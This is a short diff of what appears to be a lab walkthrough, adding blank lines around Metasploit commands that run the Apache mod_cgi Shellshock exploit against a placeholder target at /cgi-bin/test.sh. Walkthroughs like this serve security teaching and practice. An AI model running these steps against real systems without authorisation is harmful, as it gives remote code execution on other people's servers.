@@ -18,7 +18,10 @@ search shellshock
 use exploit/multi/http/apache_mod_cgi_bash_env_exec
 
 set RHOSTS targetip
+
 set TARGETURI /cgi-bin/test.sh
+
+
 run
 
 ![msfconsole 2](https://user-images.githubusercontent.com/79763515/147129528-5602c8cd-b5e5-4169-82bb-08388bf0d735.png)
